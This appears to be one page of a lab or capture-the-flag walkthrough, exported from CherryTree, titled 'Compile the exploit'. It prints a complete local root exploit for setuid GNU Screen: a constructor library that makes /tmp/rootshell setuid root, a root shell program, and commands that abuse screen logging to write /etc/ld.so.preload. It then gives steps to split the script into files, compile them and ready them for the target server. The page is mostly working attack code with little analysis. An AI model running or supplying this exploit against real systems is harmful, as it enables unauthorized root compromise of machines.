<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.1 Compile the exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>4.1 Compile the exploit</u></b></h1><br />a) Let's see what there is in the file “41154.sh”.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$cat</span>&nbsp;41154.sh</div></div><br />This script is written in C language and we have divided it into three parts (Red, Orange and Green) for manual compilation.<br /><br /><span style="color:#ff0000;">#include &lt;stdio.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;unistd.h&gt;<br />__attribute__ ((__constructor__))<br />void dropshell(void){<br />    chown("/tmp/rootshell", 0, 0);<br />    chmod("/tmp/rootshell", 04755);<br />    unlink("/etc/ld.so.preload");<br />    printf("[+] done!\n");<br />}</span><br />EOF<br />gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c<br />rm -f /tmp/libhax.c<br />cat &lt;&lt; EOF &gt; /tmp/rootshell.c<br /><span style="color:#ffa500;">#include &lt;stdio.h&gt;<br />int main(void){<br />    setuid(0);<br />    setgid(0);<br />    seteuid(0);<br />    setegid(0);<br />    execvp("/bin/sh", NULL, NULL);<br />}</span><br />EOF<br />gcc -o /tmp/rootshell /tmp/rootshell.c<br />rm -f /tmp/rootshell.c<br /><span style="color:#000000;">echo "[+] Now we create our /etc/ld.so.preload file..."</span><span style="color:#00ff00;"><br />cd /etc<br />umask 000 # because<br />screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed<br />echo "[+] Triggering..."<br />screen -ls # screen itself is setuid, so... </span><br /><span style="color:#00ff00;">/tmp/rootshell</span><br /><br />b) Create a file called “<strong>libhax.c</strong>” with the red code.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$gedit</span>&nbsp;libhax.c</div></div><br /><br />c) Create a file called “<strong>rootshell.c</strong>” with the orange code.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$gedit</span>&nbsp;rootshell.c</div></div><br /><br />d) Create a file called “<strong>script.sh</strong>” with the green code.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$gedit</span>&nbsp;script.sh</div></div><br /><br />e) Compile “<strong>libhax.c</strong>”.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$gcc</span>&nbsp;-fPIC&nbsp;-shared&nbsp;-ldl&nbsp;-o&nbsp;libhax.so&nbsp;libhax.c<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/251-1.png" alt="images/251-1.png" /><br /><br />f) Compile “<strong>rootshell.c</strong>”.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$gcc</span>&nbsp;-o&nbsp;rootshell&nbsp;rootshell.c</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/251-2.png" alt="images/251-2.png" /><br /><br />We have all we need to send to the server.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$ls</span>&nbsp;-la</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/251-3.png" alt="images/251-3.png" /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>